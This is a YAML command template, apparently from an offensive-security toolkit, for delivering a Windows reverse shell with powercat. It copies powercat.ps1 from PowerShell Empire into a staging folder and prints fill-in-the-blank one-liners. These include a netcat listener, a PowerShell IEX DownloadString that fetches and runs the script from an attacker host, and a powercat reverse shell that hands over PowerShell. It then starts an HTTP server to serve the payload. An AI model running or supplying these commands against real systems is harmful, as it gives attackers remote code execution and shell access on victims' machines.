---
metadata:
  filename: "deliver-windows-revshell-powercat.ps1.yaml"
  tags: ["shell", "windows"]
  created: "2025-03-29"
  authors: ["Unknown"]

content: |
  mkdir -p packstation/outbound; cp -n /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 packstation/outbound; \
  printf '%s\n' '================================================================'; \
  printf '%s\n' '                      -----PowerShell-----                      '; \
  printf '%s\n' 'Deliver only: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/powercat.ps1 -Outfile {{ delivery_path_windows }}\powercat.ps1'; \
  printf '%s\n' 'Preparation 1: nc -lvnp {{ shell_port }}'; \
  printf '%s\n' 'Deliver + Execute: IEX (New-Object System.Net.Webclient).DownloadString("http://{{ attacker_ip }}:{{ delivery_outbound_port }}/powercat.ps1");powercat -c {{ attacker_ip }} -p {{ shell_port }} -e powershell'; \
  printf '%s\n' '================================================================'; \
  printf '%s\n' '                         -----CMD-----                          '; \
  printf '%s\n' 'Preparation 1: nc -lvnp {{ shell_port }}'; \
  printf '%s\n' "Deliver + Execute: powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://{{ attacker_ip }}:{{ delivery_outbound_port }}/powercat.ps1');powercat -c {{ attacker_ip }} -p {{ shell_port }} -e powershell\""; \
  printf '%s\n' '================================================================'; \
  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
